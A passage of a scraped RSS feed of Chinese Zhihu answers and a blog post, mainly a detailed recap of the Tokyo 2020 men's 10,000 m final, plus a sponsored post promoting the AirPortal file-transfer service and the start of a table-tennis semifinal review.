data-original-src=\"v2-b0933ed8a45cf6a1e8eb39c6827ab2e1\" data-watermark-src=\"v2-282379d843e5346f3a161ae121cf8638\" data-private-watermark-src=\"v2-c68fa1807555b2d71e4fbc87cd182281\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/waltz-68?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">Poly</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/470408812/answer/2027319600?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">9 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/20401449?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">你会怎样向一个从没玩过俄罗斯方块的人解释这个游戏的玩法？</a><br><a href=\"http://www.zhihu.com/question/28928581?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">为什么国内连连看比俄罗斯方块火得多？</a><br>\n","link":"http://www.zhihu.com/question/470408812/answer/2027319600?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"2020 东京奥运田径男子 10000 米埃塞俄比亚选手巴雷加夺得田径首金，如何评价本场比赛？","date":"2021-07-31 06:30:08","description":"\n<p>21岁的<b>塞勒蒙·巴雷加</b>（Selemon BAREGA）捍卫了曾经格布雷塞拉西耶、贝克勒的荣耀！</p>\n<p>27分43秒22的冠军成绩成绩并不算快，但对很多赛前预估者来说，当打之年的切普特盖的落败，还是算得上是一个小冷门？</p>\n<p>埃塞俄比亚队最后几百米的战术相当成功。</p>\n<p>万米世界纪录保持者，24岁的约书亚·切普特盖27分43秒6拿到银牌，其实他今年万米跑的并不多（也不算太亮眼），这个成绩依然SB（赛季最佳）了，只可惜他今天在埃塞军团的夹击下最后也是无力反超。</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-626bd8ffa176643377a3f41ab325d75e_720w.jpeg?rss\" data-caption=\"塞勒蒙·巴雷加此前3000-5000米跑的更多些，是2019年多哈世锦赛5000米的银牌\" data-size=\"normal\" data-rawwidth=\"670\" data-rawheight=\"376\" data-watermark=\"watermark\" data-original-src=\"v2-626bd8ffa176643377a3f41ab325d75e\" data-watermark-src=\"v2-7c96d29ae286aaa9201e07f80e1a7cc7\" data-private-watermark-src=\"v2-d08dc97c064f9186128839e1e4cf69c9\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-f1d2a4a117a7f5de46eb076a0bf49288_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"670\" data-rawheight=\"376\" data-watermark=\"watermark\" data-original-src=\"v2-f1d2a4a117a7f5de46eb076a0bf49288\" data-watermark-src=\"v2-7863f3b880b276574d7c23370c69d631\" data-private-watermark-src=\"v2-558ee04208ce72442c9ac47c712b21d6\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-fa8d39bb41e241aded120d20df9bd841_720w.png?rss\" data-caption=\"塞勒蒙·巴雷加的名次看起来起起落落，实际上倒是决赛选手间的战术抉择体现，并没有那么明显的落后-逆转过程\" data-size=\"normal\" data-rawwidth=\"1204\" data-rawheight=\"658\" data-watermark=\"watermark\" data-original-src=\"v2-fa8d39bb41e241aded120d20df9bd841\" data-watermark-src=\"v2-631db7b5c7112a4d72359c8742794a30\" data-private-watermark-src=\"v2-db67eeccb9b08d2f47841538fd2b4cb1\"></p>\n<hr>\n<p>长跑算是比较垂直关注的领域了，就多说说——</p>\n<ul>\n<li><b>东京奥运会万米前瞻</b></li>\n<li><b>万米决赛现场回顾</b></li>\n<li><b>赛后复盘</b></li>\n</ul>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-ac2835a41e4e0f6ba2f046e4392f0754_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2048\" data-rawheight=\"1366\" data-watermark=\"watermark\" data-original-src=\"v2-ac2835a41e4e0f6ba2f046e4392f0754\" data-watermark-src=\"v2-d4e9e1e4fff90cea36c92df4fe9fbb80\" data-private-watermark-src=\"v2-da00cadef54249c5d9ae418e3e87508c\"></p>\n<p><br></p>\n<h2>东京奥运会万米前瞻</h2>\n<p>10000米在奥运会的径赛里一直是非常重要且传奇的项目——历史上几乎所有长跑领域的传奇选手，都拿到过奥运会万米的金牌。</p>\n<p>其中最为传奇的几位，还都拿到过至少两次。</p>\n<p><br></p>\n<p>比如上古时期的“芬兰飞人” 帕沃·努尔米（1920/1928）和拉瑟维纶（1972/1976）、上古传奇纳米尔·扎托佩克（1948/1952）、“长跑皇帝”格布雷塞拉西耶（1996/2000）、肯尼萨·贝克勒（2004/2008）、莫法拉（2012/2016）——<b>努尔米、扎托佩克、老格、贝克勒等，几乎都是长跑领域某段时期GOAT的人选。</b></p>\n<p>所以<b>奥运会的万米比赛，和历史级的长跑超级巨星，某种程度上相互成就。</b></p>\n<p>这是最耀眼的舞台，也有着最耀眼的选手。<br><br>最近几年冒出来的<b>约书亚·切普特盖</b>（Joshua Cheptegei）势头很猛，也几乎把长跑径赛和路跑的各种纪录拿到手软，很多人都把他当做老格和贝克勒的接班人（想一想这是怎样的褒奖）。<br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-bdeb27f15216b09dab1a507937942e5d_720w.jpeg?rss\" data-caption=\"切普特盖最终27分43秒6拿到银牌\" data-size=\"normal\" data-rawwidth=\"2048\" data-rawheight=\"1366\" data-watermark=\"watermark\" data-original-src=\"v2-bdeb27f15216b09dab1a507937942e5d\" data-watermark-src=\"v2-5a206df64e0f5dfeb7bb2d55d20cf7c7\" data-private-watermark-src=\"v2-5bb2c9725894126c25b3b91be8521791\"></p>\n<p>2016年里约奥运会切普特盖才19岁毕竟太年轻，当时5000米第8、10000米第6，只能算少年初体验。当时比赛中有几个细节，包括莫法拉的反超，相信对切普特盖来说是很生动的现场教学了…… 然后今年莫法拉廉颇老矣，虽然自己很想再搏一把，整个英国都给他创造条件连着数次选拔赛机会，可惜确实38岁年纪太大没法来东京。所以原本旧王退位、新王加冕的戏份就少了很多。 </p>\n<p><b>约书亚·切普特盖毫无疑问就是今晚东京奥运会10000米决赛的最强者。即便其实他今年正儿八经的万米比赛跑的并不算太多太亮眼。</b></p>\n<p>关于切普特盖直接看以前的回答吧：</p>\n<a href=\"https://www.zhihu.com/question/424644517/answer/1515786329\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic3.zhimg.com/v2-09cfda2cbf58b244917c02ad1e5671a2_bh.jpg\" data-image-width=\"1160\" data-image-height=\"678\" class=\"internal\">如何评价乌干达选手切普特盖以26分11秒00打破男子10000米世界纪录？</a><a href=\"https://www.zhihu.com/question/414420407/answer/1411416370\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic4.zhimg.com/v2-745710d4ef9af936eaa5d29280cd614d_bh.jpg\" data-image-width=\"980\" data-image-height=\"654\" class=\"internal\">如何评价乌干达选手切普特盖以 12 分 35 秒 36 打破男子 5000 米世界纪录？</a><p><br>其它几位最有竞争的，老乡<b>雅各布·基普利莫</b>，肯尼亚的<b>基普鲁托</b>和<b>科威莫</b>，埃塞的<b>塞勒蒙·巴雷加</b>、约米夫·卡加尔查、<b>贝里胡·阿雷加维</b>，还有欧洲的朱利安·万德斯和马克·斯科特、包括东道主日本的伊藤達彦和相泽晃。</p>\n<p>——这里面前面几位都算很有竞争力的选手，非常可能冲击切普特盖的金牌；朱利安·万德斯和马克·斯科特等算是欧洲白人的荣光，其实力不见得能冲击奖牌、但还是要超过很多欧洲归化的老黑们；伊藤达彦相泽晃等重在参与，不过在日本包括现在国内，都算很有人气的选手。</p>\n<p>——最后另外一点，万米对普通人来说是有氧慢跑，但对职业选手而言是很看重速度冲刺能力的高强度长跑，所以现在出成绩也是越来越早，24岁的切普特盖在决赛这些人里甚至年龄都排靠中后了。前几位乌干达/埃塞/肯尼亚的，年纪都在20-24岁，决赛最有希望冲击名次的<b>艾哈迈德</b>（索马里裔的加拿大人）也就30岁。</p>\n<p>所以和前两届莫法拉蝉联还不太一样，今年东京奥运会10000米，还是相当“年轻风暴”的。<br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-898ff8c1a9b9acc93ccf116e8c252a4a_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"670\" data-rawheight=\"376\" data-watermark=\"watermark\" data-original-src=\"v2-898ff8c1a9b9acc93ccf116e8c252a4a\" data-watermark-src=\"v2-a805e8d46887defb32e49b41d23a83d4\" data-private-watermark-src=\"v2-481d0c97c60f01d5fe8cac09e063b2e9\"></p>\n<p><br></p>\n<p>长跑言必称东非两强（肯尼亚和埃塞俄比亚），埃塞有老格和贝克勒，肯尼亚却一直很尴尬的在奥运会万米上只有1968年墨西哥奥运会拿到过冠军。后来的特加特（两次亚军）、塔努伊都只拿到银牌，所以肯尼亚的几位也会非常看重这块金牌。</p>\n<p>——乌干达、埃塞俄比亚、肯尼亚三大军团如何选择比赛战术，也是相当有看点的。</p>\n<p><br></p>\n<h2><b>东京万米决赛现场回顾</b></h2>\n<h3><b>0-3000米</b></h3>\n<p>比赛开始后大家相对保守。除了乌干达的斯蒂芬·基萨，一个人很快就跑在最前面——他显然就是在前面带节奏、发挥战术作用的。</p>\n<p>前面几圈大家表现的相对都很稳，这种名次＞成绩的比赛，选手都很会压成绩、拼后面的战术。</p>\n<p><br></p>\n<p>基萨在前面的领跑达到近100米，<b>切普特盖和最后的冠军巴雷加就“鸡贼”很多前面一公里都几乎是在末尾。几乎刚开始就放弃了追求成绩</b>；</p>\n<p>乌干达另一位热门基普利莫也是，第二公里就又降了位置，也落到很后面的位置；</p>\n<p>窝在后面的还有埃塞俄比亚的阿雷加维（最后拿到第四）。</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-231f916fb902f11b3b726fca6b40b79e_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"728\" data-rawheight=\"408\" data-watermark=\"watermark\" data-original-src=\"v2-231f916fb902f11b3b726fca6b40b79e\" data-watermark-src=\"v2-8860e14188566c1f54aac0cce24959d7\" data-private-watermark-src=\"v2-0cfa71c80657cf79a23a9a8907ae9b25\"></p>\n<p><br></p>\n<p>巴雷加此前万米跑的并不算多，过去几年更专注在3000-5000米这个距离，所以他的冲刺能力是非常强的——这也是为什么切普特盖们一直按兵不动的原因。</p>\n<p><b>所以从开始这一段，基本上一人在前面以追成好成绩（也是高风险）的快速领跑、其余最有竞争力的选手都在大部队的中后位置静候比赛后半程出招。</b></p>\n<p>巴雷加也意识到这一点，所以2-3公里的时候他提速，冲了出来，并开始实质性的领跑。</p>\n<p>前3000米后，切普特盖也提到队伍的前列中（第8）。</p>\n<p><br></p>\n<h3>3000-6000米</h3>\n<p>这一段依然并不明朗。</p>\n<p>从赛后复盘的分段名次来看，前列选手分段排名起起落落，但实际上这依然是自我战术抉择的体现，实际互相之间的落后和起伏并不大。</p>\n<p>比赛半程左右，大家的配速都稍有提升，所有选手间的间距也逐渐变大。切普特盖差不多稳定在3、4名的位置，和基普利莫前前后后的跑着。</p>\n<p>巴雷加这一段就特别迷，小集团领跑后，<b>又开始躲进了大队伍当中，藏住了自己的锋芒</b>。</p>\n<p>——所以说这场万米决赛，<b>选手互相之间心理上的博弈是很丰富的</b>。</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-61cc4b8f7e83075adde10a7e7a57a768_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"670\" data-rawheight=\"376\" data-watermark=\"watermark\" data-original-src=\"v2-61cc4b8f7e83075adde10a7e7a57a768\" data-watermark-src=\"v2-5189fbe0c3edaf4265c28a4277672b79\" data-private-watermark-src=\"v2-20da22d37272b662ee8ac13c1ac8f8d2\"></p>\n<p><br></p>\n<p>解说说到伊藤达彦和相泽晃是「企业职员」，这个说法并不代表他们日常是在企业上班的白领——日本的长跑有着很有特色的企业团文化，职业选手都是挂靠在大企业旗下，代表企业出战。所以他们依然是职业长跑选手的身份，日常几乎不参与到企业常规上班工作中。</p>\n<p>创造了日本万米国家纪录（27:18:75）的相泽晃，今天最终也跑出SB（赛季最佳）。24岁的相泽晃和23岁的伊藤达彦最终一个17一个21名——<b>在5000-10000米、乃至更长的马拉松距离，日本确实比我们是要领先不止一个身位的。</b>他们顶尖选手的数量也要远远超过我们，这个差距还是要承认的。</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-c5ec03a8564b7c37892b2da0bb3ef86e_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2048\" data-rawheight=\"1366\" data-watermark=\"watermark\" data-original-src=\"v2-c5ec03a8564b7c37892b2da0bb3ef86e\" data-watermark-src=\"v2-c74e223aeee0981e3f100cc80bca90ff\" data-private-watermark-src=\"v2-80137ee2e33ad8647a23115bdb156488\"></p>\n<p><br></p>\n<h3>6000-8000米</h3>\n<p>6000米后大部队开始拉成直线，最前最后的差距也拉到超过百米。</p>\n<p><br></p>\n<p>最开始在前面领跑的基萨过了5000米就放慢脚步，然后退赛了。<b>今天他的作用就像是鱼钩或者说浮标——可惜身后的这些选手似乎对这个鱼钩并不感冒，即没有追求成绩贸然提速，也没有表现出多少想要紧跟住他寻求破风效果的意思。</b></p>\n<p>所以电视解说认为的基萨就是为乌干达另外两人服务的说法，计划是如此，实际效果并不能说达成多少。或者说，真正帮助到约书亚·切普特盖的距离，并没有那么长。</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-13041c8df94ec36114252d334e966e05_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"670\" data-rawheight=\"376\" data-watermark=\"watermark\" data-original-src=\"v2-13041c8df94ec36114252d334e966e05\" data-watermark-src=\"v2-c74432daadbc7bdb8616e3a3178b82ad\" data-private-watermark-src=\"v2-4f14c59f7b4cd4205cd0290a8c3aed2a\"></p>\n<p><br></p>\n<p>切普特盖慢慢向前超，跑到队伍最前列，同样在前面的还有肯尼亚的基普鲁托——这位是前五公里路跑纪录创造者，破掉他纪录的正是切普特盖。</p>\n<p>处于前列的还有加拿大30岁的老将艾哈迈德（索马里裔），他今天的表现其实非常不错，孤身作战、最后一公里才掉出来，原本是有机会拿到更好名次甚至站台的。</p>\n<p><br></p>\n<h3>8000-9000米</h3>\n<p>最后两公里，多数选手咬牙，前列选手开始逐渐明朗。</p>\n<p>在最前面的基普鲁托和科威莫的消耗应该相当的大，这两个肯尼亚选手后半程依然在前列，但能明显感觉出体能出现了问题。即便这时候基普鲁托依然看上去在给切普特盖施压——如果最后几百米上演冲刺决战，基普鲁托和科威莫估计是很难有胜算的。</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-ac2835a41e4e0f6ba2f046e4392f0754_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2048\" data-rawheight=\"1366\" data-watermark=\"watermark\" data-original-src=\"v2-ac2835a41e4e0f6ba2f046e4392f0754\" data-watermark-src=\"v2-d4e9e1e4fff90cea36c92df4fe9fbb80\" data-private-watermark-src=\"v2-da00cadef54249c5d9ae418e3e87508c\"></p>\n<p><br></p>\n<h3>最后1000米</h3>\n<p>进入最后几圈时候，排位依次是肯尼亚的科威莫、乌干达的切普特盖和基普鲁托、加拿大的艾哈迈德、埃塞俄比亚的巴雷加和卡加尔查。</p>\n<p>这时候<b>埃塞俄比亚三驾马车开始发威，三人几乎一起从第一集团的前中后开始、从外道超越，呈现出钳制的队形。</b></p>\n<p>他们三人在外圈相当于既保持了整个队形（队伍中很难有人能冲出来，除非极大的提速消耗）、又能对前面的切普特盖保持冲击。</p>\n<p>所以最后这一段看，在所有选手体能都即将竭尽的时候，面对这三人的封锁，要么提早冲，要么被耗在里面，或者就等着巴雷加、卡加尔查、阿雷加维自己垮掉……</p>\n<p><br></p>\n<p>最后600米，老将艾哈迈德冲了出来，开始起速。切普特盖依然在跟，但逐渐被巴雷加赶上。</p>\n<p><b>最后的冲刺决斗，阿雷加维依然在“封堵”、乌干达的切普特盖和基普利莫开始冲、巴雷加展现出极强的维持极速的能力……切普特盖的冲刺依然很给力，甚至于如果再多个100米，比赛结果说不定就反过来了。</b></p>\n<p><b>不过21岁的巴雷加依然笑到了最后。</b></p>\n<p><br></p>\n<p>最终，</p>\n<p>巴雷加27分43秒22，金牌；</p>\n<p>切普特盖27分43秒6，银牌；</p>\n<p>基普利莫27分43秒88，铜牌；</p>\n<p>阿雷加维27分46秒16，第四；</p>\n<p>美国的费舍尔·格兰特最后超过艾哈迈德，第五；</p>\n<p>艾哈迈德第六，科威莫第七。</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-626bd8ffa176643377a3f41ab325d75e_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"670\" data-rawheight=\"376\" data-watermark=\"watermark\" data-original-src=\"v2-626bd8ffa176643377a3f41ab325d75e\" data-watermark-src=\"v2-7c96d29ae286aaa9201e07f80e1a7cc7\" data-private-watermark-src=\"v2-d08dc97c064f9186128839e1e4cf69c9\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-f1d2a4a117a7f5de46eb076a0bf49288_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"670\" data-rawheight=\"376\" data-watermark=\"watermark\" data-original-src=\"v2-f1d2a4a117a7f5de46eb076a0bf49288\" data-watermark-src=\"v2-7863f3b880b276574d7c23370c69d631\" data-private-watermark-src=\"v2-558ee04208ce72442c9ac47c712b21d6\"></p>\n<p><br></p>\n<h2>赛后复盘</h2>\n<p>21岁的塞勒蒙·巴雷加捍卫了曾经格布雷塞拉西耶、贝克勒的荣耀——<b>人类的长跑史上，格布雷塞拉西耶和贝克勒就如同马拉多纳和梅西一样——这样的比喻下，可能更远古的扎托佩克就是贝利了。</b></p>\n<p>27分43秒22的冠军成绩成绩并不算快，但对很多赛前预估者来说，当打之年的切普特盖的落败，还是算得上是一个小冷门？——赛前不少对冠军的预测中，尽管切普特盖未必在自己的最佳状态，他和基普利莫的二人组依然被视为最大热门。而埃塞俄比亚队最后几圈的战术相当成功，也实现了捍卫埃塞俄比亚荣耀、「让乌干达人回家」的目标。</p>\n<p><br></p>\n<p>成绩不算好，观赏性不差，战术也很强。</p>\n<p>另外费舍尔·格兰特、艾哈迈德乃至两位东道主都表现出自己的水准。</p>\n<p><br></p>\n<p>对切普特盖而言，他肯定依然是万米这个距离的最强者，但这次没有拿下金牌确实相当的可惜，毕竟按如今东非军团的飞速发展态势，3年后的巴黎奥运会，届时27岁的他未必依然像现在这么火热了。</p>\n<p>看看后面5000米他的表现吧。</p>\n<p><br></p>\n<p>再次恭喜塞勒蒙·巴雷加和埃塞俄比亚！</p>\n<p><br></p>\n<hr>\n<p>东京奥运会期间，相关的赛事资讯都会在知乎想法中发布，感谢关注<a href=\"https://www.zhihu.com/org/yun-dong-fen-zi-cheng-lan-wen-hua\" class=\"internal\">运动分子</a></p>\n<hr>\n<ul>\n<li><a href=\"https://www.zhihu.com/question/476000617/answer/2028599848\" class=\"internal\">如何评价 2020 东京奥运会游泳男子 200 米个人混合泳决赛汪顺夺金？</a></li>\n<li><a href=\"https://www.zhihu.com/question/474850082/answer/2026108063\" class=\"internal\">奥运射击选手是如何看清靶子的？</a></li>\n<li><a href=\"https://www.zhihu.com/question/474575633/answer/2024002780\" class=\"internal\">为什么一些国家的奥运乒乓球选手是华人？</a></li>\n<li><a href=\"https://www.zhihu.com/question/50191573/answer/1953518631\" class=\"internal\">为什么中国运动员运动寿命短？</a></li>\n<li><a href=\"https://www.zhihu.com/question/344468000/answer/1854947316\" class=\"internal\">新中国体育史上，有哪些比赛的瞬间令你沸腾？</a></li>\n<li><a href=\"https://www.zhihu.com/question/373511126/answer/1608008791\" class=\"internal\">举重运动员有多牛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/341661943/answer/1452491051\" class=\"internal\">撑杆跳这项运动的意义是什么，是如何发明的？</a></li>\n<li><a href=\"https://www.zhihu.com/question/293545938/answer/489299124\" class=\"internal\">一个身体素质普通的人被车拉着能达到博尔特的速度吗？</a></li>\n<li><a href=\"https://www.zhihu.com/question/39665045/answer/275431053\" class=\"internal\">历史上有哪些精心布局却被对方一下破局的故事？</a></li>\n<li><a href=\"https://www.zhihu.com/question/20403477/answer/712635036\" class=\"internal\">110 米栏的顶级运动员，为什么他们不参加100米的比赛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/302684797/answer/544389984\" class=\"internal\">男生100m跑到11s很奇怪嘛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/282601379/answer/528371413\" class=\"internal\">跑150米然后截取速度最快的连续100米区间作为100米的成绩是否更合理？</a></li>\n<li><a href=\"https://www.zhihu.com/question/352385663/answer/884879335\" class=\"internal\">为什么马拉松选手最后不冲刺？</a></li>\n<li><a href=\"https://www.zhihu.com/question/39239070/answer/594491009\" class=\"internal\">体育赛事中有哪些「几乎不可破」的纪录？</a></li>\n<li><a href=\"https://www.zhihu.com/question/24987243/answer/1357448925\" class=\"internal\">跑5公里需要多少分钟？</a></li>\n<li><a href=\"https://www.zhihu.com/question/407047274/answer/1363793504\" class=\"internal\">很多退役的军人都说自己五公里可以15/16分，军队的训练真的这么强么？</a></li>\n<li><a href=\"https://www.zhihu.com/question/24987243/answer/1357448925\" class=\"internal\">为什么田径室外百米记录要比室内百米记录快？</a></li>\n</ul>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/yun-dong-fen-zi-cheng-lan-wen-hua?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">运动分子</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/476149568/answer/2029677017?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">3 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/475130160?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">2020 东京奥运篮球男子组团队小组赛C组日本 77:88 西班牙，如何评价本场比赛？</a><br><a href=\"http://www.zhihu.com/question/476766015?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">2020 东京奥运场地自行车赛女子组团体争先赛中国队夺金，如何评价本场比赛？</a><br>\n","link":"http://www.zhihu.com/question/476149568/answer/2029677017?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何免费不限速传输文件？你应该试试 AirPortal！","date":"2021-07-30 10:50:00","description":"\n<p>微信传输限制 200M （电脑端 1GB），某度网盘的限速实在离谱。</p>\n<p>那么，如何快速、简单的传输文件呢？</p>\n<p>AirPortal 可以解决这个难题！</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%AE%89%E5%85%A8\" class=\"headerlink\" title=\"安全\"></a>安全</h2>\n<p>可以设置取件密码，在输入取件码的同时还要输入密码，进一步保护文件安全。</p>\n<p>可以设置下载次数，达到一定下载次数时自动从服务器上删除文件，无法下载。</p>\n<p>可以设置保存小时数，超过时间后自动从服务器上删除文件，无法下载。</p>\n<p>当用户多次输入错误的取件码时，将自动弹出验证码，核实是否为真实用户。</p>\n<img webp-comp src=\"https://bu.dusays.com/2021/07/30/c6da584dd68d5.png\"><h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E4%BE%BF%E5%BF%AB%E9%80%9F\" class=\"headerlink\" title=\"方便快速\"></a>方便快速</h2>\n<p>AirPortal 不限速，提供多地区服务器下载。</p>\n<img webp-comp src=\"https://bu.dusays.com/2021/07/30/2194e7359dab2.png\"><p>无论是否是高级用户，都将文件存储在 OSS，提高服务可用性与下载速度。</p>\n<p>无需多余的步骤，打开客户端或网页版输入取件码和密码（如有设置）就可以下载。</p>\n<p>在两台设备上登录同一个账号后，在其中任意一台设备上传文件，在另一台设备上会自动询问是否接收，无需输入取件码。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%85%8D%E7%99%BB%E5%BD%95%E4%BD%BF%E7%94%A8\" class=\"headerlink\" title=\"免登录使用\"></a>免登录使用</h3>\n<p>AirPortal 可以免登录使用，以下是一些限制：</p>\n<table>\n<thead><tr>\n<th align=\"center\">未登录</th>\n<th align=\"center\">免费</th>\n<th align=\"center\">高级</th>\n</tr></thead>\n<tbody>\n<tr>\n<td align=\"center\">无限流量</td>\n<td align=\"center\">无限流量</td>\n<td align=\"center\">10GB + 结余</td>\n</tr>\n<tr>\n<td align=\"center\">单次上传 1GB</td>\n<td align=\"center\">单次上传 2GB</td>\n<td align=\"center\">无限</td>\n</tr>\n</tbody>\n</table>\n<img webp-comp src=\"https://bu.dusays.com/2021/07/30/1b7b87e798158.png\"><h3>\n<a href=\"https://blog.yfun.top/#%E7%AE%80%E6%B4%81%E7%9A%84%E9%A1%B5%E9%9D%A2\" class=\"headerlink\" title=\"简洁的页面\"></a>简洁的页面</h3>\n<p>没有花里胡哨的广告和弹窗，简洁明了，点击「发送」就可以发送文件或文字。</p>\n<img webp-comp src=\"https://bu.dusays.com/2021/07/30/3aa77007547f5.png\"><h3>\n<a href=\"https://blog.yfun.top/#Wi-Fi-%E5%BF%AB%E4%BC%A0\" class=\"headerlink\" title=\"Wi-Fi 快传\"></a>Wi-Fi 快传</h3>\n<p>在同一局域网下，使用客户端开启「Wi-Fi 快传」功能，文件传输不经过热铁盒服务器与公网，更快速，更安全。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%89%AA%E8%B4%B4%E6%9D%BF%E5%85%B1%E4%BA%AB\" class=\"headerlink\" title=\"剪贴板共享\"></a>剪贴板共享</h3>\n<p>基于 Wi-Fi 快传的剪贴板共享功能，可以轻松实现跨设备复制粘贴，零延迟，支持多种操作系统。</p>\n<p>（需要同时打开客户端并连接 Wi-Fi 快传，iOS 端将会以文本方式同步到客户端）</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%A4%9A%E5%B9%B3%E5%8F%B0\" class=\"headerlink\" title=\"多平台\"></a>多平台</h2>\n<p>拥有 iOS, 安卓, Windows, macOS 与 Linux 平台的客户端，其余平台也可以使用 网页端。</p>\n<p>官方网址：<a href=\"https://airportal.cn/\">https://airportal.cn/</a></p>\n<p>*: 感谢 AirPortal 空投的支持！</p> ","link":"https://blog.yfun.top/posts/2021/airportal/"},{"title":"2020 东京奥运乒乓球男单半决赛樊振东 4:3 险胜林昀儒晋级决赛，如何评价本场比赛？","date":"2021-07-30 06:30:07","description":"\n<p>恭喜樊振东抢七战胜小小林，4比3进入决赛！太过惊心动魄的一场比赛！</p>\n<p>继混双、女单过后，再次预测成功：</p>\n<a data-draft-node=\"block\" data-draft-type=\"link-card\" href=\"https://www.zhihu.com/answer/2012764905\" class=\"internal\">叶子盛：怎么看待奥运会乒乓球比赛抽签结果？伊藤美诚与孙颖莎同半区，樊振东与张本同半区，昕雯与日组合分属半区？</a><p>樊振东不论从任何方面，都是当世实力第一。奥运一路杀过来，也面对了无数冲击，樊振东对可能遇到的困难是有准备的。而小小林也不是等闲之辈，近年曾在T2上战胜樊振东。虽然那个比赛的赛制有点奇怪，也不是特别正式，但也是计入国际乒联的积分的，因此绝对可以体现出他的实力。前面打爆张本的达科，被小小林4比0带走。这场球，非常有看点。</p>\n<p>小小林一向以敏捷轻快、思路活跃、反手犀利著称。第一局果然给樊振东造成极大麻烦，直接拿下此局。小小林的发球变化极多，长球偷得又快又低，严重限制了樊振东的上步拧拉。同时正反手中近台的加力爆撕爆摁上台率也是极高。樊振东这边则没有完全适应这个节奏，相持中经常找不到点，而且小小林的力量相对弱势，反而让樊振东在相持中难以借力。</p>\n<p>第二场起直至第五场，双方进入了白热化的贴身肉搏战。樊振东状态慢慢回升，在长球的高质量对抗中取得上风；而小小林则一直保持反手的强势，拧拉接发力量很足但旋转偏弱，樊振东的回防屡屡下网；节奏的控制也很好，既然打快，那就一路快到底，樊振东反倒显得偏慢了。樊振东虽比第一局适应许多，但仍打得不舒服，全倚仗自己厚实的基本功硬吃硬撑。</p>\n<p>小小林的正手力量是薄弱项，但打球的确很聪明，竭尽全力不让樊振东抓住；如果被抓住了，那就搏杀一板，丢了不亏，上了刚好挫败一下樊振东的锐气。樊振东的中间四局打得非常艰难，没有几球的位置是舒舒服服能让他发力的，但仍努力找到间隙去发力得分。好在樊振东对小小林的偷长球适应了许多，算是少了一个劣势。</p>\n<p>第四局小小林增加了一些正手进攻的变化，起初的几球开始违背自己原本的特长，开始加旋转了。樊振东反而不太适应，引拍的防守本来都蹲着平直的弧线了，因而防守出界失分。可见小小林无时无刻不在尝试着变化。毕竟从纸面实力上来说，他还从未在赛制正规的国际比赛上战胜过樊振东。</p>\n<p>除了坚决执行拼搏的技战术，小小林的心态也是持续的稳定。早就有冷面杀手绰号的他，在奥运赛场上也是一副淡如水的神情，倒颇有几分魔王气质。相比而言，樊振东的心理状态肉眼可见有很大的起